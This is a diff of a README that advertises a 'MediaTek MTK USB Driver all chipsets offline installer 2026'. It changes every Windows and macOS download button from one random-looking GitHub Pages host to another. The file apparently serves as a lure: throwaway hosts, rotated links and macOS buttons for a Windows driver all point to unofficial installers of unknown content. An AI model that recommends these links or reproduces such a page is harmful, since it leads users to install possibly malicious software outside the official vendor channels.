@@ -4,8 +4,8 @@
 
 **MediaTek MTK USB Driver all chipsets offline installer 2026**
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
-[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -48,9 +48,9 @@
 
 <div align="center">
 
-[![Windows Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows)](https://yobowgileysb.github.io/WinDownload/)
+[![Windows Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows)](https://mixedlinkrelease.github.io/installer/)
 
-[![macOS Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20macOS-000000?style=for-the-badge&logo=apple)](https://yobowgileysb.github.io/MacDownload/)
+[![macOS Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20macOS-000000?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
